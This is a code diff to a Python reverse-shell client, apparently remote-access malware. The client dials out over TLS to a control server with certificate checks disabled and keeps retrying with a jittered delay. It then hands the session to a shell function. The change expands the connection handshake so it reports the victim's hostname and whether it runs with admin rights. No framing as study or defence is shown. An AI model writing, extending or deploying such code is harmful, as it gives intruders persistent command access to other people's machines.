@@ -176,24 +176,30 @@ def shell(sock):
 
 # === TLS Connection + Handshake ===
 def handshake(sock):
-    reliable_send(sock, {"status": "connected", "platform": platform.system()})
+    reliable_send(sock, {
+        "status": "connected",
+        "platform": platform.system(),
+        "hostname": socket.gethostname(),
+        "admin": is_admin()
+    })
     print("[DEBUG] Handshake sent")
 
 def connection():
     context = ssl.create_default_context()
     context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
+    context.verify_mode = ssl.CERT_NONE  # Skip validation
 
     while True:
         try:
             print(f"[DEBUG] Connecting to {SERVER_HOST}:{SERVER_PORT}")
             with socket.create_connection((SERVER_HOST, SERVER_PORT)) as raw_sock:
                 with context.wrap_socket(raw_sock, server_hostname=SERVER_HOST) as sock:
-                    print("[+] Connected over TLS")
+                    print("[+] Connected over TLS (No cert validation)")
                     handshake(sock)
                     shell(sock)
         except Exception as e:
             print(f"[ERROR] Connection error: {e}")
             time.sleep(RECONNECT_DELAY + int.from_bytes(os.urandom(1), 'little') % 5)
+
 
 connection()
